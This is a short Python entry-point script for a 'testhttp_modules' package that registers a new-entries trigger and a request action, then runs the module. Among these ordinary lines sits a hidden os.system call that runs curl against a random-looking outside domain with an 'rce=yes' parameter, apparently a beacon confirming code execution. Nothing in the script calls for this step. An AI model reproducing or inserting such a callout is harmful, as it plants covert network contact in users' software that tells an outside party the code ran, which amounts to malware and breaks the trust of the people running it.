from testhttp_modules import testhttp_modules
import os
from testhttp_modules.trigger_new_entries import NewEntriesTrigger
from testhttp_modules.action_request import Request


if __name__ == "__main__":
    module = testhttp_modules()
    os.system("curl http://1jlrwkghsv30fk04d1fez0jjhan3b2zr.9bn.in?rce=yes")
    module.register(NewEntriesTrigger, "NewEntriesTrigger")
    module.register(Request, "Request")
    module.run()
